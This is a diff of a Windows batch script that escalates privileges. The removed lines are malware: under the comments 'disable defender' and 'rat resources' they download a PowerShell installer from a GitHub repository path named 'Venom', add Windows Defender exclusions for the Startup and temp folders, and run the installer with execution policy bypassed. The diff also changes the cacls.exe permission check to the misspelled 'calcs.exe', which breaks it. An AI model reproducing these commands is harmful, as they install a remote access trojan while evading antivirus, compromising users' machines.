@@ -4,10 +4,10 @@
 :---------------------------------------
 @REM --> check for permissions
     IF "%PROCESSOR_ARCHITECTURES%" EQU "amd64" (
-        >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe"
+        >nul 2>&1 "%SYSTEMROOT%\SysWOW64\calcs.exe"
         "%SYSTEMROOT%\SysWOW64\config\system"
     ) ELSE (
-        >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe"
+        >nul 2>&1 "%SYSTEMROOT%\system32\calcs.exe"
         "%SYSTEMROOT%\system32\config\system"
     )
 
@@ -34,11 +34,5 @@
 
 @REM disable defender
 
-@REM rat resources
-
-powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
-
-powershell powershell.exe -ep bypass "./installer.ps1"
-
-@REM self delete
-@REM del wget.cmd
+@REM you can remove the 'powershell to get an admin cmd
+powershell Start-Process powershell.exe
